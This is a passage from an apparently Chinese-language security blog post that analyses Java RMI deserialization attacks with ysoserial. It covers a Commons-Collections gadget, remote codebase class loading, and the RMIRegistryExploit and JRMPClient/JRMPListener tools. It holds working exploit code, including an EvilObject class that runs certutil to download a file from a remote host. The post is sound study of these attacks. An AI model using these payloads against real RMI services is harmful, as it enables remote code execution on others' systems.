<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 编译过程</span></span><br><span class="line">javac <span class="literal">-cp</span> C:\Users\xxxx\.gradle\caches\modules<span class="literal">-2</span>\files<span class="literal">-2</span>.<span class="number">1</span>\commons<span class="literal">-collections</span>\commons<span class="literal">-collections</span>\<span class="number">3.1</span>\<span class="number">40</span>fb048097caeacdb11dbb33b5755854d89efdeb\commons<span class="literal">-collections</span><span class="literal">-3</span>.<span class="number">1</span>.jar;. HappyEnding.java</span><br><span class="line"></span><br><span class="line"><span class="comment">## 运行过程</span></span><br><span class="line">java <span class="literal">-cp</span> C:\Users\xxxx\.gradle\caches\modules<span class="literal">-2</span>\files<span class="literal">-2</span>.<span class="number">1</span>\commons<span class="literal">-collections</span>\commons<span class="literal">-collections</span>\<span class="number">3.1</span>\<span class="number">40</span>fb048097caeacdb11dbb33b5755854d89efdeb\commons<span class="literal">-collections</span><span class="literal">-3</span>.<span class="number">1</span>.jar;. HappyEnding</span><br></pre></td></tr></table></figure>

<p><strong>小提示2：</strong>之前在分析恶意Payload时有一点不太明白，就是有些恶意类看似可以直接装入集合类，但ysoserial的作者们却都选择了“先用正常数据初始化集合类，再用反射机制将恶意类对象替换入集合类”的方法。最初我以为是为了应对命令行参数，这次复现过程中我发现，如果采用直接装入集合类的方式，在有些情况下还没等序列化完成payload就被触发了，导致整个生成过程中断，所以大家采用了后一种方法。可能读者会不知所云，这里举个例子：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以上面的代码段为例，如果不用分隔符中的那段代码</span></span><br><span class="line"><span class="comment">// 而是按我想当然的写法来做：</span></span><br><span class="line">BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(entry);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 看似一句话就能将恶意entry送入BadAttributeValueExpException对象完成初始化</span></span><br><span class="line"><span class="comment">// 但在实际运行过程中，程序在初始化val对象时会先初始化entry对象，从而使payload在本地先执行</span></span><br><span class="line"><span class="comment">// 这不光会打断生成逻辑，试想本地是win系统，而被攻击者是linux系统</span></span><br><span class="line"><span class="comment">// 你要执行的代码在win下无法识别，此时程序就会报运行时错误，程序也无法到达发送序列化参数那一步</span></span><br><span class="line"><span class="comment">// 所以先用正常数据完成对象初始化，最后用反射机制填入恶意类对象的办法很管用</span></span><br></pre></td></tr></table></figure>

<p>运行效果如图：</p>
<p><img src="exp1.jpg"></p>
<p>实际在Server端的调用栈如下图：</p>
<p><img src="Server_rdobj.jpg"></p>
<p>因为RCE肯定会执行到<code>BadAttributeValueExpException</code>的<code>ReadObject()</code>方法，所以在这里打了断点守着。</p>
<p>从图中可以看出大致的调用过程：线程池ThreadPool收到连接请求后，对传输数据TCPTransport解析识别，并对其中的数据进行反序列化<code>UnicastRef.unmashalValue()</code>，最后经过<code>java.io</code>的层层调用，到达了恶意类的<code>ReadObject()</code>方法，后面的调用过程这里不再赘述。</p>
<h3 id="攻击Server——方法2"><a href="#攻击Server——方法2" class="headerlink" title="攻击Server——方法2"></a>攻击Server——方法2</h3><p>利用JVM动态加载类制发起攻击，该机制的原理类似Unix-like系统的源机制，如果JVM要调用某个类但在当前classpath中找不到其定义，则会按照<code>java.rmi.server.codebase</code>属性（其他默认限制条件都打开）定义的远程地址寻找类的class文件。codebase支持<code>http://</code>、<code>ftp://</code>、<code>file://</code>等协议，举几个会触发远程加载的情形：</p>
<ul>
<li>对于客户端，如果<em>调用的服务端方法的返回值是某个已知类的子类</em>，但客户端本身没有该子类的class文件，客户端就<strong>会按服务端提供的codebaseURL去加载类</strong>。</li>
<li>对于服务端，如果<em>客户端传递给方法的参数是原参数类型的子类</em>，但服务端没有该子类的class文件，服务端就<strong>会按客户端提供的codebaseURL去加载类</strong>。</li>
</ul>
<p>开启RMI的codebase特性需要满足以下条件：</p>
<ol>
<li><p>需要安装RMISecurityManager并且配置java.security.policy。</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="comment">/** Code Related  **/</span></span><br><span class="line"></span><br><span class="line">&gt;<span class="keyword">import</span> java.lang.SecurityManager;</span><br><span class="line"></span><br><span class="line">&gt;System.setProperty(<span class="string">&quot;java.security.policy&quot;</span>, xxx.class.getClassLoader().getResource(<span class="string">&quot;java.policy&quot;</span>).getFile());</span><br><span class="line">&gt;SecurityManager securityManager = <span class="keyword">new</span> SecurityManager();</span><br><span class="line">&gt;System.setSecurityManager(securityManager);</span><br></pre></td></tr></table></figure>
<p>在resources文件夹下写入java.policy文件：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  &gt;//Standard extensions get all permissions by default</span><br><span class="line"></span><br><span class="line">  &gt;grant &#123;</span><br><span class="line">permission java.security.AllPermission;</span><br><span class="line">  &gt;&#125;;</span><br></pre></td></tr></table></figure></blockquote>
</li>
<li><p>属性 java.rmi.server.useCodebaseOnly 的值必需为false。从JDK 6u45、7u21开始，其默认值就是true。</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>,<span class="string">&quot;false&quot;</span>);</span><br></pre></td></tr></table></figure></blockquote>
</li>
<li><p>以上特性也可以通过修改jvm启动参数实现：</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.useCodebaseOnly=<span class="keyword">false</span> -Djava.security.policy=<span class="string">&quot;policy.permission&quot;</span> xxx</span><br></pre></td></tr></table></figure></blockquote>
</li>
</ol>
<p>测试代码如下，首先是客户端、服务端都知道的公共接口：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Services</span> <span class="keyword">extends</span> <span class="title">java</span>.<span class="title">rmi</span>.<span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function">Object <span class="title">sendMessage</span><span class="params">(String msg)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Services接口的sendMessage()方法</span></span><br><span class="line"><span class="comment">// 其返回值为Object类、参数为String类</span></span><br></pre></td></tr></table></figure>

<p>接着是服务端代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*	ServicesImpl1.java</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServicesImpl1</span> <span class="keyword">implements</span> <span class="title">Services</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//这里在服务端将返回值为Object的子类——ExportObject类</span></span><br><span class="line">    <span class="comment">//客户端并不知道该类的定义内容</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">sendMessage</span><span class="params">(String msg)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        Object tt= <span class="string">&quot;FDF&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            tt= <span class="keyword">new</span> EvilObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> tt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*	EvilObject.java</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="comment">// 恶意类的定义，除了构造函数还有static&#123;&#125;段内可写payload，当然也可以写入别的方法，但需要接口类中有调用</span></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilObject</span><span class="params">()</span>  <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;certutil.exe -urlcache -split -f \&quot;http://10.10.10.136:8000/123.txt\&quot; d:\\path_to_desktop\\bad.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* testRMI.java</span></span><br><span class="line"><span class="comment">* 主要的服务端代码</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">testRMI</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 实例化服务端远程对象</span></span><br><span class="line">            ServicesImpl1 obj = <span class="keyword">new</span> ServicesImpl1();</span><br><span class="line">            <span class="comment">// 没有继承UnicastRemoteObject时需要使用静态方法exportObject处理</span></span><br><span class="line">            Services services = (Services) UnicastRemoteObject.exportObject(obj, <span class="number">0</span>);</span><br><span class="line">            <span class="comment">//设置java.rmi.server.codebase</span></span><br><span class="line">            System.setProperty(<span class="string">&quot;java.rmi.server.codebase&quot;</span>, <span class="string">&quot;http://10.10.10.1:8000/&quot;</span>);</span><br><span class="line">            System.setProperty(<span class="string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>,<span class="string">&quot;false&quot;</span>);</span><br><span class="line">            Registry reg;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 创建Registry</span></span><br><span class="line">                reg = LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;java RMI registry created. port on 9999...&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Using existing registry&quot;</span>);</span><br><span class="line">                reg = LocateRegistry.getRegistry();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//绑定远程对象到Registry</span></span><br><span class="line">            reg.bind(<span class="string">&quot;Services&quot;</span>, services);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要注意的是，恶意类应当也实现下Serializable接口，否则客户端调用会报错，而且也不会去请求codebase，但这不影响RCE。在异常产生之前，服务端代码执行的过程已经发生了。紧接着客户端代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.SecurityManager;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">testRMI</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//如果需要使用RMI的动态加载功能，需要开启RMISecurityManager，并配置policy以允许从远程加载类库</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.security.policy&quot;</span>, testRMI.class.getClassLoader().getResource(<span class="string">&quot;java.policy&quot;</span>).getFile());</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>,<span class="string">&quot;false&quot;</span>);</span><br><span class="line">        SecurityManager securityManager = <span class="keyword">new</span> SecurityManager();</span><br><span class="line">        System.setSecurityManager(securityManager);</span><br><span class="line"></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;10.10.10.1&quot;</span>, <span class="number">9999</span>);</span><br><span class="line">        <span class="comment">// 获取远程对象的引用</span></span><br><span class="line">        Services services = (Services) registry.lookup(<span class="string">&quot;Services&quot;</span>);</span><br><span class="line">        services.sendMessage(<span class="string">&quot;everybody&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的场景和之前描述的一致，10.10.10.136是一台linux主机，上面开启了http的8000端口，同时也是RMI客户端。10.10.10.1是一台win10主机，也是RMI服务端，它同时提供了codebase的URL地址。客户端在调用方法时因其不知返回值EvilObject类的定义，所以会按照codebase URL去找class文件。服务端依据客户端提供的参数在自己的JVM上实例化对象并执行方法调用，在实例化EvilObject对象时执行了payload。</p>
<p><img src="port8000.jpg"></p>
<h3 id="攻击server——方法3，攻击Registry"><a href="#攻击server——方法3，攻击Registry" class="headerlink" title="攻击server——方法3，攻击Registry"></a>攻击server——方法3，攻击Registry</h3><p>其实，只要知道注册机的IP、端口，客户端也可以调用<code>bind()</code>函数绑定RMI对象，这也是存在这种攻击方式的原因。下面分析的攻击代码源自ysoserial工具的<code>exploit/RMIRegistryExploit</code>，主要代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">**	exploit/RMIRegistryExploit.java</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> String host = args[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> port = Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">final</span> String command = args[<span class="number">3</span>];</span><br><span class="line">    Registry registry = LocateRegistry.getRegistry(host, port);</span><br><span class="line">    <span class="keyword">final</span> String className = CommonsCollections1.class.getPackage().getName() +  <span class="string">&quot;.&quot;</span> + args[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">final</span> Class&lt;? extends ObjectPayload&gt; payloadClass = (Class&lt;? extends ObjectPayload&gt;) Class.forName(className);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 测试RMI registry连接状态</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        registry.list();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(ConnectIOException ex) &#123;</span><br><span class="line">    <span class="comment">// 如果失败升级为SSL连接</span></span><br><span class="line">        registry = LocateRegistry.getRegistry(host, port, <span class="keyword">new</span> RMISSLClientSocketFactory());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 确保exp不在构造函数或反序列化阶段触发</span></span><br><span class="line">    exploit(registry, payloadClass, command);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">exploit</span><span class="params">(<span class="keyword">final</span> Registry registry,</span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="keyword">final</span> Class&lt;? extends ObjectPayload&gt; payloadClass,</span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">new</span> ExecCheckingSecurityManager().callWrapped(<span class="keyword">new</span> Callable&lt;Void&gt;()&#123;<span class="function"><span class="keyword">public</span> Void <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectPayload payloadObj = payloadClass.newInstance();</span><br><span class="line">        Object payload = payloadObj.getObject(command);</span><br><span class="line">        String name = <span class="string">&quot;pwned&quot;</span> + System.nanoTime();</span><br><span class="line">        <span class="comment">// 这里的createMap()创建了一个hashmap，键是&quot;pwned+时间戳&quot;,值是payload</span></span><br><span class="line">        <span class="comment">// createMemoitizedProxy()由上面的hashmap，创建一个Remote子类的代理对象</span></span><br><span class="line">        Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 调用bind()函数，触发后续反序列化调用</span></span><br><span class="line">            registry.bind(name, remote);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Utils.releasePayload(payloadObj, payload);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">**	Gadgets.java</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;String, Object&gt; <span class="title">createMap</span> <span class="params">( <span class="keyword">final</span> String key, <span class="keyword">final</span> Object val )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Map&lt;String, Object&gt; map = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">    map.put(key, val);</span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createMemoitizedProxy</span> <span class="params">( <span class="keyword">final</span> Map&lt;String, Object&gt; map, <span class="keyword">final</span> Class&lt;T&gt; iface, <span class="keyword">final</span> Class&lt;?&gt;... ifaces )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> createProxy(createMemoizedInvocationHandler(map), iface, ifaces);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InvocationHandler <span class="title">createMemoizedInvocationHandler</span> <span class="params">( <span class="keyword">final</span> Map&lt;String, Object&gt; map )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createProxy</span> <span class="params">( <span class="keyword">final</span> InvocationHandler ih, <span class="keyword">final</span> Class&lt;T&gt; iface, <span class="keyword">final</span> Class&lt;?&gt;... ifaces )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Class&lt;?&gt;[] allIfaces = (Class&lt;?&gt;[]) Array.newInstance(Class.class, ifaces.length + <span class="number">1</span>);</span><br><span class="line">    allIfaces[ <span class="number">0</span> ] = iface;</span><br><span class="line">    <span class="keyword">if</span> ( ifaces.length &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        System.arraycopy(ifaces, <span class="number">0</span>, allIfaces, <span class="number">1</span>, ifaces.length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据参数分析用法应该为：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Usage:</span><br><span class="line">java <span class="literal">-cp</span> ysoserial<span class="literal">-all</span><span class="literal">-0</span>.x.x.jar ysoserial.exploit.RMIRegistryExploit [<span class="type">targetIP</span>] [<span class="type">port</span>] [<span class="type">Payload</span>] [<span class="type">cmd</span>]</span><br><span class="line">Example:</span><br><span class="line">java <span class="literal">-cp</span> target\ysoserial<span class="literal">-0</span>.<span class="number">0.6</span><span class="literal">-SNAPSHOT</span><span class="literal">-all</span>.jar ysoserial.exploit.RMIRegistryExploit <span class="number">127.0</span>.<span class="number">0.1</span> <span class="number">5599</span> CommonsCollections2 <span class="string">&quot;calc.exe&quot;</span></span><br></pre></td></tr></table></figure>

<p>利用成功的条件是RMIregistry所在的主机有CommonsCollections2执行需要的类。因为RMI registry经常和RMI server设置于同一台服务器上，所以攻击它也能达到攻击服务器的目的。</p>
<p>分析以上过程，payloadClass由命令行参数2决定，这里是CommonsCollections2。于是主函数初始化了它的实例，并<code>getObject(command)</code>生成了payload（PriorityQueue -&gt; TransformingComparator  -&gt; InvokerTransformer -&gt; …）；在得到payload后现将它存入一个hashmap，再用<code>createMemoizedInvocationHandler(hashmap, Remote.class)</code>生成一个Remote接口的代理类。通过<code>bind()</code>函数将这个代理类发送给注册机反序列化。</p>
<p>注册机在收到序列化数据后的处理过程如下图，前面的从线程池接受请求到TCPTransport处理请求的过程这里不再详述，如果想知道细节，可以读这篇→<a href="">https://xz.aliyun.com/t/2223 </a>，其中<code>“RMI Server 的 RegistryImpl”</code>章节详细分析了服务端注册表的<code>bind()</code>过程。</p>
<p><img src="Server_registry.jpg"></p>
<p>这里分析的是中间的过程，看调用栈可知<code>RegistryImpl_Skel</code>的<code>dispatch()</code>方法调用了开启了<code>readObject()</code>，反序列化得到第一个类是<code>AnnotationInvocationHandler</code>，它的<code>readObject()</code>方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">**	AnnotationInvocationHandle.java</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">// ****	SNIP	****</span></span><br></pre></td></tr></table></figure>

<p><code>var1</code>的<code>defaultReadObject()</code>反序列化出了代理类的Hashmap对象，该对象的key-value又分别反序列化，如图：</p>
<p><img src="defaultReadObject.jpg"></p>
<p>value在反序列化时就引发了后面的调用过程（PriorityQueue -&gt; TransformingComparator  -&gt; InvokerTransformer -&gt; …），如下： P.S.详见Ysoserial工具解读（二）。</p>
<p><img src="Server_registry2.jpg"></p>
<h3 id="攻击Client"><a href="#攻击Client" class="headerlink" title="攻击Client"></a>攻击Client</h3><p>（目前这一部分内容代码暂未调通，等待后续补充. . .）</p>
<h2 id="YSOSERIAL中的RMI相关代码"><a href="#YSOSERIAL中的RMI相关代码" class="headerlink" title="YSOSERIAL中的RMI相关代码"></a>YSOSERIAL中的RMI相关代码</h2><p>其实ysoserial中的很多代码利用了JDK RMI的实现代码，而且其<code>payloads</code>和<code>exploit</code>文件夹下的代码用途不尽相同，具体如下：</p>
<h3 id="Exploit-JRMPClient-——-Payloads-JRMPListener"><a href="#Exploit-JRMPClient-——-Payloads-JRMPListener" class="headerlink" title="Exploit/JRMPClient —— Payloads/JRMPListener"></a>Exploit/JRMPClient —— Payloads/JRMPListener</h3><p>这俩exp经常一起使用，其用法如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 1. 生成JRMPListener的payload.bin</span></span><br><span class="line">java <span class="literal">-jar</span> ysoserial<span class="literal">-xxx</span>.jar JRMPListner [<span class="type">port</span>] &gt; payload.bin</span><br><span class="line"><span class="comment">## 2. 将payload.bin发送给服务端让其反序列化，这会在服务器上开启一个端口</span></span><br><span class="line"><span class="comment">## 3. 用JRMPClient生成payload并发起连接，将攻击payload发给它：</span></span><br><span class="line">java <span class="literal">-cp</span> ysoserial<span class="literal">-xxx</span>.jar ysoserial.exploit.JRMPClient [<span class="type">targetIp</span>] [<span class="type">port</span>] [<span class="type">payload_type</span>] [<span class="type">payload_arg</span>]</span><br></pre></td></tr></table></figure>

<p>这里分开介绍一下吧。</p>
